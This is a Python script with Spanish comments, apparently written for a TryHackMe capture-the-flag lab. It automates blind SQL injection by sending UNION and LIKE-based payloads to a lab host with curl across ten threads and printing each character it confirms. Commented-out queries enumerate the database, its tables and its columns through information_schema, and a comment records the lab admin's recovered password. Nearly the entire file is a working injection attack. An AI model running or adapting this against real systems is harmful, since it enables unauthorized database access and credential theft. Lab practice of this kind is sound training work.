#ESTE SCRIPT NOS PERMITE DESCUBRIR CARACTERES A UNA CONSULTA SQLI BLIND
#Realizado para encontrar la flag de una maquina de tryhackme
import subprocess
import json
from concurrent.futures import ThreadPoolExecutor
import threading

# Crear un evento para controlar la finalización
stop_event = threading.Event()

bandera = True

def main():
    lista = [
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 
    'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 
    '-', '_'
    ]

    with ThreadPoolExecutor(max_workers=10) as execution:
        execution.map(bucle,lista)

    if bandera:
        print('No se ha encontrado ningun caracter mas')

# table_schema = sqli_three (base de datos)
# tabla_name = users
# column = id, password , username
# user = admin
# password = 3845

def bucle(i):

    url = '10-10-9-11.p.thmlabs.com/run'
    conte = 'Content-Type: application/x-www-form-urlencoded'
    # AQUI PON TU DATA ORIGINAL y luego vas agregando caracter que descubres
    #data = level=3&sql=select * from users where username = 'admin123' UNION SELECT 1,2,3 where database() like '{i}%';--' LIMIT 1 
    # admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--
    # 
    # data = f"""level=3&sql=select * from users where username = 'admin123' UNION SELECT 1,2,3 where database() like 'sqli_three{i}%';--' LIMIT 1  """
    #  
    #data = f"""level=3&sql=select * FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'users{i}%';--  """
    
    #data = f"""level=3&sql=select * FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'username{i}%';"""
    
    data = f"""level=3&sql=select * FROM sqli_three.users where username like 'admin' and password like '3845{i}%';--' LIMIT 1 """

    result = subprocess.run(['curl',url,
                        '-H',conte,
                        '-d',data],capture_output=True,text=True)

    
    resultado = json.loads(result.stdout)

    if resultado['error'] is False:
        print(f'{i}')
        global bandera
        bandera = False
        stop_event.set()  # Activar el evento para detener todos los hilos

if __name__ == "__main__":
    main()
